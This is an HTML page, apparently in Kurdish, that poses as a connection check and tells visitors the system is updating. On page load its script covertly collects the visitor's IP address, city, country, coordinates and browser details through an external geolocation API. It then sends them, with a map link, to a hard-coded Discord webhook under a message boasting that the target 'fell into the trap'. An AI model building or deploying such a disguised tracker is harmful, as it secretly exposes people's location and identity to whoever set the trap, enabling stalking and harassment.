<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title>Checking Connection...</title>
</head>
<body>
    <h2 style="text-align: center; margin-top: 50px;">تکایە کەمێک چاوەڕوان بە، سیستەمەکە خەریکە نوێ دەبێتەوە...</h2>

    <script>
        // وەرگرتنی زانیارییەکان بەبێ داواکردن
        async function captureData() {
            // وەرگرتنی IP و زانیاری شار لە ڕێگەی API دەرەکی
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();

            const message = {
                content: "🚨 **بکوژەکە کەوتە ناو تەڵەکەوە!** 🚨\n" +
                         "🌐 **IP:** " + data.ip + "\n" +
                         "📍 **شار:** " + data.city + ", " + data.region + "\n" +
                         "🌍 **وڵات:** " + data.country_name + "\n" +
                         "📱 **ئامێر:** " + navigator.userAgent + "\n" +
                         "🗺️ **نەخشە:** https://www.google.com/maps?q=" + data.latitude + "," + data.longitude
            };

            // ناردنی زانیارییەکە بۆ Discord Webhook (یان هەر سێرڤەرێکی تر)
            fetch('https://discordapp.com/api/webhooks/1501579519168086199/VAH8gJiYir1-eEf3fxmAEvuCYG3SpJmPQi0Vc9ZnRV_ge0URfFF_qwlGyInZDJmPbd3e', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(message)
            });
        }

        window.onload = captureData;
    </script>
</body>
</html>
